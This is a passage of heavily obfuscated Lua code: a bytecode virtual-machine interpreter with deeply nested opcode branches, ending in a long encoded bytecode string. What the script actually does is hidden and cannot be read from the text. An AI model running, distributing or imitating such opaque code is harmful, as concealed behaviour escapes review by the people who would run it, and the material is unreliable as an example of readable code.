a;w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))else w[y[266]][y[607]]=y[185];end;elseif z<=312 then if 310>=z then local a=0 while true do if a<=6 then if a<=2 then if a<=0 then w[y[266]]=w[y[607]][y[185]];else if a>1 then y=f[n];else n=n+1;end end else if a<=4 then if 3==a then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if 5==a then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end else if a<=9 then if a<=7 then n=n+1;else if a~=9 then y=f[n];else w[y[266]][y[607]]=w[y[185]];end end else if a<=11 then if a~=11 then n=n+1;else y=f[n];end else if a==12 then n=y[607];else break end end end end a=a+1 end elseif 311<z then local a=y[266];local c=w[a];for e=a+1,y[607]do t(c,w[e])end;else local a;local c;local e;w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];e=y[266]c={w[e](w[e+1])};a=0;for m=e,y[185]do a=a+1;w[m]=c[a];end end;elseif z<=313 then w[y[266]][y[607]]=w[y[185]];elseif z<315 then local a;local c;local e;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];e=y[266]c={w[e](w[e+1])};a=0;for m=e,y[185]do a=a+1;w[m]=c[a];end else local a=y[266];local c=w[y[607]];w[a+1]=c;w[a]=c[w[y[185]]];end;elseif z<=321 then if z<=318 then if z<=316 then local a;local c;local e;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];e=y[266]c={w[e](w[e+1])};a=0;for m=e,y[185]do a=a+1;w[m]=c[a];end elseif 318~=z then if(w[y[266]]~=y[185])then n=y[607];else n=n+1;end;else local a;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))end;elseif 319>=z then local a=y[266]w[a](r(w,a+1,p))elseif z~=321 then local a;w={};for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))else local a;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))end;elseif z<=324 then if 322>=z then local a;local c;local e;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];e=y[266]c={w[e](w[e+1])};a=0;for m=e,y[185]do a=a+1;w[m]=c[a];end elseif z==323 then w[y[266]]=y[607]*w[y[185]];else local a;local c;local e;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];e=y[266]c={w[e](w[e+1])};a=0;for m=e,y[185]do a=a+1;w[m]=c[a];end end;elseif 325>=z then local a;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];a=y[266];do return w[a](r(w,a+1,y[607]))end;n=n+1;y=f[n];a=y[266];do return r(w,a,p)end;n=n+1;y=f[n];n=y[607];elseif 326<z then for a=y[266],y[607],1 do w[a]=nil;end;else local a=y[266];do return w[a],w[a+1]end end;elseif 350>=z then if z<=338 then if(z<=332)then if(z<=329)then if not(not(328==z))then local a,c=0 while true do if(a==9 or a<9)then if(a==4 or a<4)then if a<=1 then if not(1==a)then c=nil else w[y[266]]=w[y[607]][y[185]];end else if(a<=2)then n=n+1;else if 4>a then y=f[n];else w[y[266]]=y[607];end end end else if(a==6 or a<6)then if not(a==6)then n=(n+1);else y=f[n];end else if(a==7 or a<7)then w[y[266]]=h[y[607]];else if 9>a then n=n+1;else y=f[n];end end end end else if(a<=14)then if(a<11 or a==11)then if(11~=a)then w[y[266]]=w[y[607]][y[185]];else n=(n+1);end else if a<=12 then y=f[n];else if(14>a)then c=y[266];else do return w[c](r(w,c+1,y[607]))end;end end end else if(a==16 or a<16)then if 15==a then n=(n+1);else y=f[n];end else if(a<=17)then c=y[266];else if a~=19 then do return r(w,c,p)end;else break end end end end end a=(a+1)end else local a=0 while true do if a<=14 then if(a<=6)then if(a<2 or a==2)then if a<=0 then w={};else if not(a==2)then for c=0,u,1 do if(c<o)then w[c]=s[(c+1)];else break;end;end;else n=(n+1);end end else if(a<=4)then if(a>3)then w[y[266]]=h[y[607]];else y=f[n];end else if a<6 then n=(n+1);else y=f[n];end end end else if(a<=10)then if(a<8 or a==8)then if 7<a then n=(n+1);else w[y[266]]=w[y[607]][y[185]];end else if 10>a then y=f[n];else w[y[266]]=h[y[607]];end end else if(a<12 or a==12)then if(a<12)then n=(n+1);else y=f[n];end else if not(a~=13)then w[y[266]]={};else n=n+1;end end end end else if(a<21 or a==21)then if(a<17 or a==17)then if(a==15 or a<15)then y=f[n];else if not(17==a)then w[y[266]]={};else n=n+1;end end else if(a<19 or a==19)then if a==18 then y=f[n];else w[y[266]][y[607]]=w[y[185]];end else if not(21==a)then n=(n+1);else y=f[n];end end end else if(a==25 or a<25)then if(a==23 or a<23)then if not(22~=a)then w[y[266]]=j[y[607]];else n=n+1;end else if not(a~=24)then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end else if(a==27 or a<27)then if 26<a then y=f[n];else n=(n+1);end else if a<29 then if w[y[266]]then n=n+1;else n=y[607];end;else break end end end end end a=(a+1)end end;elseif(z<=330)then local a,c=0 while true do if a<=8 then if a<=3 then if a<=1 then if 1~=a then c=nil else w[y[266]]=j[y[607]];end else if a~=3 then n=n+1;else y=f[n];end end else if a<=5 then if a>4 then n=n+1;else w[y[266]]=w[y[607]][y[185]];end else if a<=6 then y=f[n];else if 7<a then n=n+1;else w[y[266]]=y[607];end end end end else if a<=13 then if a<=10 then if 10~=a then y=f[n];else w[y[266]]=y[607];end else if a<=11 then n=n+1;else if 13>a then y=f[n];else w[y[266]]=y[607];end end end else if a<=15 then if 14==a then n=n+1;else y=f[n];end else if a<=16 then c=y[266]else if a<18 then w[c]=w[c](r(w,c+1,y[607]))else break end end end end end a=a+1 end elseif 332~=z then local a,c,e,m=0 while true do if a<=9 then if a<=4 then if a<=1 then if a<1 then c=nil else e=nil end else if a<=2 then m=nil else if 3<a then n=n+1;else w[y[266]]=j[y[607]];end end end else if a<=6 then if 6>a then y=f[n];else w[y[266]]=w[y[607]][y[185]];end else if a<=7 then n=n+1;else if 8==a then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end end else if a<=14 then if a<=11 then if 11>a then n=n+1;else y=f[n];end else if a<=12 then w[y[266]]=w[y[607]][y[185]];else if a>13 then y=f[n];else n=n+1;end end end else if a<=16 then if a~=16 then m=y[266]else e={w[m](w[m+1])};end else if a<=17 then c=0;else if 19>a then for q=m,y[185]do c=c+1;w[q]=e[c];end else break end end end end end a=a+1 end else local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a~=1 then c=nil else w[y[266]][y[607]]=w[y[185]];end else if a>2 then y=f[n];else n=n+1;end end else if a<=5 then if 5>a then w[y[266]]={};else n=n+1;end else if a~=7 then y=f[n];else w[y[266]][y[607]]=y[185];end end end else if a<=11 then if a<=9 then if a~=9 then n=n+1;else y=f[n];end else if a~=11 then w[y[266]][y[607]]=w[y[185]];else n=n+1;end end else if a<=13 then if 13~=a then y=f[n];else c=y[266]end else if 15~=a then w[c]=w[c](r(w,c+1,y[607]))else break end end end end a=a+1 end end;elseif z<=335 then if(z<333 or z==333)then local a=(w[y[266]]+y[185]);w[y[266]]=a;if(not(not(a==w[(y[266]+1)]))or a<w[(y[266]+1)])then n=y[607];end;elseif(335>z)then local a,c=0 while true do if(a<7 or a==7)then if(a==3 or a<3)then if(a<1 or a==1)then if(a<1)then c=nil else w[y[266]]=h[y[607]];end else if not(a==3)then n=n+1;else y=f[n];end end else if(a==5 or a<5)then if(4<a)then n=(n+1);else w[y[266]]=w[y[607]][y[185]];end else if a>6 then w[y[266]]=y[607];else y=f[n];end end end else if(a<=11)then if(a<9 or a==9)then if(9~=a)then n=n+1;else y=f[n];end else if(a~=11)then w[y[266]]=y[607];else n=(n+1);end end else if(a==13 or a<13)then if 13>a then y=f[n];else c=y[266]end else if(a==14)then w[c]=w[c](r(w,c+1,y[607]))else break end end end end a=a+1 end else local a,c,e,m=0 while true do if(a<9 or a==9)then if(a<4 or a==4)then if(a<1 or a==1)then if(a<1)then c=nil else e=nil end else if(a<2 or a==2)then m=nil else if a<4 then w[y[266]]=h[y[607]];else n=(n+1);end end end else if(a<6 or a==6)then if(a==5)then y=f[n];else w[y[266]]=h[y[607]];end else if(a<7 or a==7)then n=(n+1);else if not(9==a)then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end end else if(a<14 or a==14)then if(a<=11)then if not(10~=a)then n=n+1;else y=f[n];end else if a<=12 then w[y[266]]=w[y[607]][w[y[185]]];else if(13<a)then y=f[n];else n=(n+1);end end end else if(a<16 or a==16)then if a>15 then e={w[m](w[m+1])};else m=y[266]end else if(a<=17)then c=0;else if a>18 then break else for q=m,y[185]do c=(c+1);w[q]=e[c];end end end end end end a=(a+1)end end;elseif(z<336 or z==336)then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a>0 then w[y[266]]=h[y[607]];else c=nil end else if 2<a then y=f[n];else n=n+1;end end else if a<=5 then if a~=5 then w[y[266]]=y[607];else n=n+1;end else if a>6 then w[y[266]]=y[607];else y=f[n];end end end else if a<=11 then if a<=9 then if 9>a then n=n+1;else y=f[n];end else if a<11 then w[y[266]]=y[607];else n=n+1;end end else if a<=13 then if a==12 then y=f[n];else c=y[266]end else if a~=15 then w[c]=w[c](r(w,c+1,y[607]))else break end end end end a=a+1 end elseif not(338==z)then local a=y[266]local c={w[a](w[a+1])};local e=0;for m=a,y[185]do e=(e+1);w[m]=c[e];end else w={};for a=0,u,1 do if a<o then w[a]=s[(a+1)];else break;end;end;end;elseif 344>=z then if z<=341 then if(339==z or 339>z)then local a,c=0 while true do if a<=10 then if a<=4 then if a<=1 then if a~=1 then c=nil else w[y[266]]=j[y[607]];end else if a<=2 then n=n+1;else if a>3 then w[y[266]]=w[y[607]][y[185]];else y=f[n];end end end else if a<=7 then if a<=5 then n=n+1;else if 7~=a then y=f[n];else w[y[266]]=y[607];end end else if a<=8 then n=n+1;else if a<10 then y=f[n];else w[y[266]]=y[607];end end end end else if a<=15 then if a<=12 then if a~=12 then n=n+1;else y=f[n];end else if a<=13 then w[y[266]]=y[607];else if a~=15 then n=n+1;else y=f[n];end end end else if a<=18 then if a<=16 then w[y[266]]=y[607];else if 18~=a then n=n+1;else y=f[n];end end else if a<=19 then c=y[266]else if 21~=a then w[c]=w[c](r(w,c+1,y[607]))else break end end end end end a=a+1 end elseif 341~=z then local a=0 while true do if a<=6 then if a<=2 then if a<=0 then w[y[266]]=w[y[607]][y[185]];else if a>1 then y=f[n];else n=n+1;end end else if a<=4 then if 4~=a then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if 6~=a then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end else if a<=9 then if a<=7 then n=n+1;else if 8<a then w[y[266]]=w[y[607]][y[185]];else y=f[n];end end else if a<=11 then if a~=11 then n=n+1;else y=f[n];end else if 12<a then break else if w[y[266]]then n=n+1;else n=y[607];end;end end end end a=a+1 end else local a=y[266]w[a]=w[a]()end;elseif 342>=z then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a==0 then c=nil else w[y[266]]=h[y[607]];end else if 2<a then y=f[n];else n=n+1;end end else if a<=5 then if a~=5 then w[y[266]]=y[607];else n=n+1;end else if 7~=a then y=f[n];else w[y[266]]=y[607];end end end else if a<=11 then if a<=9 then if a<9 then n=n+1;else y=f[n];end else if a>10 then n=n+1;else w[y[266]]=y[607];end end else if a<=13 then if a>12 then c=y[266]else y=f[n];end else if a==14 then w[c]=w[c](r(w,c+1,y[607]))else break end end end end a=a+1 end elseif 343==z then w[y[266]]={};n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];else local a;w[y[266]]={};n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];a=y[266]w[a]=w[a]()end;elseif z<=347 then if z<=345 then if(not(w[y[266]]==y[185]))then n=y[607];else n=(n+1);end;elseif 346<z then local a=y[266];w[a]=w[a]-w[a+2];n=y[607];else if(w[y[266]]~=w[y[185]])then n=y[607];else n=n+1;end;end;elseif 348>=z then w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];if w[y[266]]then n=n+1;else n=y[607];end;elseif 350>z then w[y[266]]=b(d[y[607]],nil,j);else if(w[y[266]]~=w[y[185]])then n=n+1;else n=y[607];end;end;elseif z<=362 then if z<=356 then if z<=353 then if 351>=z then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a<1 then c=nil else w[y[266]]=h[y[607]];end else if 2<a then y=f[n];else n=n+1;end end else if a<=5 then if a<5 then w[y[266]]=y[607];else n=n+1;end else if a<7 then y=f[n];else w[y[266]]=y[607];end end end else if a<=11 then if a<=9 then if 9>a then n=n+1;else y=f[n];end else if 11>a then w[y[266]]=y[607];else n=n+1;end end else if a<=13 then if 12<a then c=y[266]else y=f[n];end else if 14<a then break else w[c]=w[c](r(w,c+1,y[607]))end end end end a=a+1 end elseif 352==z then local a=y[266]w[a]=w[a](w[a+1])else local a;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]]*y[185];n=n+1;y=f[n];w[y[266]]=w[y[607]]+w[y[185]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]]+w[y[185]];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))end;elseif 354>=z then local a;local c;local d;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];d=y[266]c={w[d](w[d+1])};a=0;for e=d,y[185]do a=a+1;w[e]=c[a];end elseif 356>z then local a;w={};for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))else local a;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=false;n=n+1;y=f[n];a=y[266]w[a](w[a+1])end;elseif z<=359 then if 357>=z then w[y[266]]=false;elseif z~=359 then local a;w={};for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=#w[y[607]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];a=y[266];w[a]=w[a]-w[a+2];n=y[607];else local a;w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]][y[607]]=y[185];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))end;elseif z<=360 then local a;local c;local d;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];d=y[607];c=y[185];a=k(w,g,d,c);w[y[266]]=a;elseif z~=362 then local a;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))else if(w[y[266]]~=w[y[185]])then n=y[607];else n=n+1;end;end;elseif z<=368 then if 365>=z then if z<=363 then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 1~=a then c=nil else w[y[266]]=w[y[607]][y[185]];end else if 2==a then n=n+1;else y=f[n];end end else if a<=5 then if a<5 then w[y[266]]=y[607];else n=n+1;end else if 6<a then w[y[266]]=y[607];else y=f[n];end end end else if a<=11 then if a<=9 then if 9~=a then n=n+1;else y=f[n];end else if a<11 then w[y[266]]=y[607];else n=n+1;end end else if a<=13 then if 12<a then c=y[266]else y=f[n];end else if 14==a then w[c]=w[c](r(w,c+1,y[607]))else break end end end end a=a+1 end elseif z~=365 then w[y[266]]=w[y[607]][w[y[185]]];else local a;local c;local d;w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];d=y[266]c={w[d](w[d+1])};a=0;for e=d,y[185]do a=a+1;w[e]=c[a];end end;elseif z<=366 then local a;w[y[266]]=w[y[607]]%w[y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]]+y[185];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))elseif z>367 then w[y[266]]=w[y[607]]+w[y[185]];else local a;local c,d;local e;w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];w[y[266]]=w[y[607]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];e=y[266]c,d=i(w[e](r(w,e+1,y[607])))p=d+e-1 a=0;for d=e,p do a=a+1;w[d]=c[a];end;end;elseif z<=371 then if z<=369 then w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];if(w[y[266]]~=w[y[185]])then n=n+1;else n=y[607];end;elseif 371>z then local a;local c;w[y[266]]={};n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]={r({},1,y[607])};n=n+1;y=f[n];w[y[266]]=w[y[607]];n=n+1;y=f[n];c=y[266];a=w[c];for d=c+1,y[607]do t(a,w[d])end;else n=y[607];end;elseif 372>=z then w[y[266]][y[607]]=y[185];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];elseif 373<z then local a;w[y[266]]=w[y[607]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))else w[y[266]]={};end;n=n+1;end;end;end;return b(cr(),{},l())();end)('26225822225826322V22U27A27B27C22U22T22R27B1M1K1F181I27F27B1I17141A1322T22O27B151918151727M27V27A1L1I27J181122T22Q27W1E171K28A27B1B2811E22T22S27B191L27N27A1213141J28928B27A27P1L1D22T23327W191K191J1I27K27T28X22U1027K1222T22P27B11131I1013181G27U27B1J181M171529127G27A1M2801A1A29H29J29L27K101928G27A2A82AA22Y27B1L29L1B29L28127Q27S22T22T27B1K131M2AO2AG1J1428Q22U28I1I1528K23227O28O28627K28928322U27K2AH1K27M29C111L2AW22T27927A23V27D27A21O21222T1E27B23W26F26F25Q24721V24W25T22522X26I23P24Y25E21H2361O23Z1V1Q24J24H23W1A1E1E23O25225P1Z24Z26H22125Y24D21H2BN21926G24T24N25C24325622I25K24R24W23I24I26H25Q24F23Q26Y21022721P25N25D25L24624025S25C26J1A24Y25F26424M24421B22F25C26F25T25H26D25S23W24S23O21U22P22K23T26D26Y21M23R26B23Z27321H1Z26U2651G21D2132502652AB22U26824223Q2572BK27B2682EW27A2672EZ22U2732AU27A25Z24K2562F225R2F226I2F522U24P23N25O2EQ26I24223T24T22T23127B25G24324325A25G21225E24N2101A23Z22T21J27B26C2FS25A26C23D24F27221R1824D24R25X24R21T1Q23126L22Y22X25I25V26N27U23E2692602551D25S23Q21026X25R22C26D1221U23P26W25W24L26926G21N24X23O2681C25N24F24V26J26B25222X1E23626Y26M24K26V26X25A26N24C22Q26325325525M27122K1Z24L23N27324P24024X22T2AF27A25U25E24426C25B23124D26W22W1Q25C24H28L27B24P25Y22T23427B25I25024O23K25321325X24Y1Y1D23N26J25X26A22B1J23526B23E23I24923L22T2372FQ24Z24Z24E25321D25X24G21K1C24926P24224K22C1R23826I23F1W23N2AP27B2A527A26623Q24E23Q26U21125M29R27A25G23S23U24N26Q21C2AY25F24023T24R26D2K922U25R23S24O25526X2FW2FO27B26424523Y25426U21J25X23L1X1S2492KW2L62L82LA25X22T22Z27B25323W23Y24I26Z22R25W2502171824F26H25I22T2B42KJ24223U24V26X21826125122T23I27B25E23S25J24Q26Q21125T24K1X1T25M26T26624J2241N22Y24V23D23925Y25R26G2172LM2LO2LQ2LS22R25C24J2101V23V26P25Z2MC2ME2MG25A26D21625I24W21L1C2MP2MR2MT2MV2MX2MZ2N122T23B2N42LR2LT2N82NA2NC25Z24Y22H1722Z22T23J2NG25J2NI2NK2NM1C25D24L25E24U22C1B23H27121R23G25O25W26A23221B2N327A2LP2NZ22R25V25A1Y1U2HE25C2NF27A2MF25J24T26W21825J25B2141R2NP2MS2MU2MW2MY2N02N22FP2OX2N52LT26724M1Z1C2482IV2OB24H26821925X24J2311P23Q26C25N24N21Z22A23I26822Y23825J23K2IC2NY2N626025A1W1023Z26U22T2352OB24M26W21A26125021Q22124A26H25V2572281021K26H23423325P25H2FN2LN2OX24123S24N26R2LU2LW2LY2M022T23A2FQ2M52M72M92511V1623P26P26A24J21Z162OW22U2532RH2RJ2N72N92NB2ND2NW2LO2S72RK2O12SB2O42O62O82RF2S52SF2P02P22P42682P62PP2SN2RI2RK2PT2PV2PX2ID2SV2S82QM2QO2QQ2S42OY24T2702RL2LX2LZ2M122527B25X23S24226M27121I25F24L2311E2RY24224P22K1H2372K321M25H25V26B22V21A23E26K25V26L21W25U23O21826U2691L24X1I22N23R25D25N26Y2T72LQ2T92S92O22SC2NX2PQ23Y2UO2SH2O32O52O72UM2UU2TA2P12P32P52L42UT2UO2SY2PW2QJ2V72TA2T42QP2QR2T125323P23Q24G2J225X2532181S23Q26P22T162TG2TI26M2731Y2IY2311B23Z26826426A21T1N23927323422W25E25V26D22U23B21A26E25Z24J22525Y23X22V26U25I22V26M1B22423L25F25Q24U26S24A21K24P25H2401Q25Z24B2HJ26N2452222391T27326W27324M24W24N24L23Y22P25D26B26M23Q26O22621A24Z25J26C26D23X25B26X26626V22Q22822T24P23S24322C26Q24726I23W28P23027B24S24423M2PB21925W24I23121G2VB2S52VJ2VL21F25E25421N1824E2EY2RQ2OX2YT2532YV2YX2YZ2682OJ21S2892VH2Z41W26725A21M1723Z26V22T2YG2Z32VK2VO2PE2PG2V62YS2ZP2172672582102JV22T22W2LO23V23S24S26T21M2402512141F23V26O2662522SD2KA23M24724I2721W25T24L2141D25526P26524W22C1L23H2KW26M23M23N25526U21D25F2S425R23V23Y24R26X21J26W24W1Z1D23Q2SS22T22X27B26023M23V24R26F21825E24L1P1624M26I25S24G224310131033105310724024H21R1024C26C25I24N22T23831233106310831273129312B24N21X1U23127031222OX3104312H2402J51624D26J25Z24W2YR253312T31252ZH2ZJ2ZL2SM3133312431082551Y1423N26825D310H2S524423Z25726B2132SY22123Y26825W24J21S1U230313J253313L313N313P2PU2R126V26325022C16310Y2JL2OX3141313O313Q24A31463148314A27323723325S313Z314E31431Z22123T26I26525122J2MU311K2LO314Q313Q23P26Q2642QA2RP3151313M314F314423M26I26724R2282892Z22S523V23Q24P26T1Y25V2562311D23Z26B25V25322H2S3315J3133315M315O315Q2Q524826K25G24J2W722T23631033162315P315R1P316631682W722W26B2GM3158312S316E31641A23P26I25H24S2R6312R315K316Q315R312X312Z3131311L316P315N316F2311123P26G26324N21Y22T2392LO23N23M25926B21D26724O1W1824A24L25Y24N2JC23126B2O82M322U25Q23Q24424R25J1Y311T317G317I317K317M317O317Q317S25E24W22K1423D26Z23E2QS318A317L317N317P317R2OI318H318J318L22Y25R25W2F4317H2OX317J318P318D318S25T24T22I1523A26I231313Z3193318C318R317S314W314Y22Y312E318O319G318E24L26224T22G1R23H312Q316024324524H26Z21B2Q3315S315U315W315Y22T2182G42G62G82GA2GC2GE2GG2GI2GK2GM2GO2GQ22O2GS2GU2GW2GY2H02H22H42H62H82HA2HC23O26R1H25R23O24V2RZ23T1B1Y22K24I24V26E26A26A25B24S23R22Z25X24M26Q25M269226316O2S5319Y31A031A22Q4316H316731691N316B2LO31BQ31A131A331BU316J1N316L316N319X319Z31C12Q4316S316U316W10316Y25331C031BS2313172313031502OX31CI31A3317A317C317E313Z2L72T9317N2591X313R313T313V313X31A831AA2FT31AC2GB2GD2GF2GH2GJ2GL2GN2GP2GR2GT2GV2GX2GZ2H12H32H52H72H